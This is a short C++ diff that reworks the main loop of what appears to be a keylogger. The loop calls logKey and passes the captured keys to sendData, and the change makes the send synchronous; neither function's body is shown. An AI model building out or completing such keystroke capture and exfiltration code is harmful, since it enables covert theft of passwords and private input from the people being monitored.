@@ -4,11 +4,11 @@ using namespace std;
 
 main() {
     future<char *> keys;
-    future<bool> dataSent;
+    bool dataSent;
     bool firstLoop = true;
-    while ( firstLoop || dataSent.get() ) {
+    while ( firstLoop || dataSent ) {
         keys = async(logKey);
-        dataSent = async(sendData(keys.get()));
+        dataSent = sendData(keys.get());
         firstLoop = false;
     }
     return 0;
